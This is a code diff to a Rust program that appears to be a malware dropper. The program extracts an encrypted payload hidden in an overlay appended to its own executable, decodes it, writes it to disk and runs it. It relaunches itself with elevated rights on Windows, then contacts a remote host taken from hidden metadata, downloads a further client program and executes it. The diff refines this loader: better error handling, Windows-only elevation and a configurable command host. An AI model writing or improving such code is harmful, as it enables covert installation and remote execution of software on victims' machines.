@@ -15,6 +15,8 @@ use std::env::{current_exe, join_paths};
 use std::convert::TryInto;
 use rsa::PaddingScheme;
 use shared::utils::{decrypt, KEY, xor};
+
+#[cfg(windows)]
 use is_elevated::is_elevated;
 
 struct Overlay {
@@ -22,77 +24,92 @@ struct Overlay {
     meta: OverlayMeta
 }
 
-fn should_run() -> bool {
+fn reason_do_not_run() -> Option<String> {
 
     // already downloaded client?
     for name in vec!(utils::NAME1.to_string(), utils::NAME2.to_string()).iter() {
         if Path::new(&name).exists() {
-            return false;
+            return Some("client already present".to_string());
         }
     }
 
-    true
+    None
 }
 
-fn extract_overlay() -> Overlay {
-    let mut bytes = read(current_exe().unwrap()).unwrap();
+fn extract_overlay() -> Result<Overlay> {
+    let mut bytes = read(current_exe()?)?;
     let mut offset = bytes.len();
 
-    let encrypted_size: u32 = u32::from_be_bytes(bytes[offset-4..].try_into().unwrap());
+    let encrypted_size: u32 = u32::from_be_bytes(bytes[offset-4..].try_into()?);
     offset -= 4;
 
-    let encrypted = String::from_utf8(bytes[offset-(encrypted_size as usize)..offset].to_vec()).unwrap();
+    let encrypted = String::from_utf8(bytes[offset-(encrypted_size as usize)..offset].to_vec())?;
     offset -= encrypted_size as usize;
 
-    let meta: OverlayMeta = decrypt(&encrypted, &KEY).unwrap();
+    let meta: OverlayMeta = decrypt(&encrypted, &KEY)?;
     let payload = bytes[offset-(meta.payload_size as usize)..offset].to_vec();
 
-    Overlay {
+    Ok(Overlay {
         bytes: xor(&payload, &meta.secret),
         meta
-    }
+    })
 }
 
-fn main() {
+fn main_result() -> Result<()> {
     utils::tmpdir();
 
-    let current = current_exe().unwrap().to_str().unwrap().to_string();
-    if !is_elevated() {
-        runas::Command::new(current).status().unwrap();
-        return;
+    #[cfg(windows)]
+    {
+        let current = current_exe()?.to_str()?.to_string();
+        if !is_elevated() {
+            runas::Command::new(current).status()?;
+            return Err("not elevated".into());
+        }
     }
 
     // ensure, that payload is extracted
-    let name = current_exe().unwrap().file_name().unwrap().to_str().unwrap().to_string();
-    let path = std::env::current_dir().unwrap().join(&name);
+    let name = current_exe()?.file_name().unwrap().to_str().unwrap().to_string();
+    let path = std::env::current_dir()?.join(&name);
 
+    // work with overlay
+    let overlay = extract_overlay()?;
     if !path.exists() {
-        let overlay = extract_overlay();
-
-        let mut file = File::create(&path).unwrap();
-        file.write_all(&overlay.bytes).unwrap();
+        let mut file = File::create(&path)?;
+        file.write_all(&overlay.bytes)?;
     }
 
     // and run it!
-    Command::new(&path).spawn().unwrap();
+    Command::new(&path).spawn()?;
 
     // ...
     utils::chdir();
 
     // check if we should continue?
-    if !should_run() {
-        return;
+    if let Some(reason) = reason_do_not_run() {
+        return Err(reason.into());
     }
 
-    let mut api_client = Api::new("10.211.55.2", 8000, false);
+    let mut api_client = Api::new(&overlay.meta.host, 8000, false);
     api_client.login(&SystemInfo {
         cpu_total: 0.0,
         mem_total: 0.0
-    }).unwrap();
+    })?;
 
-    let upload = api_client.client_download().unwrap();
-    let path = utils::save(upload).unwrap();
+    let upload = api_client.client_download()?;
+    let path = utils::save(upload)?;
 
     // run program!
-    Command::new(path).spawn().unwrap();
+    Command::new(path).spawn()?;
+
+    Ok(())
+}
+
+fn main() {
+    if let Err(err) = main_result() {
+        utils::chdir();
+
+        // save error message on disk.
+        let mut file = File::create("win.lck").unwrap();
+        file.write_all(err.to_string().as_bytes()).unwrap();
+    }
 }
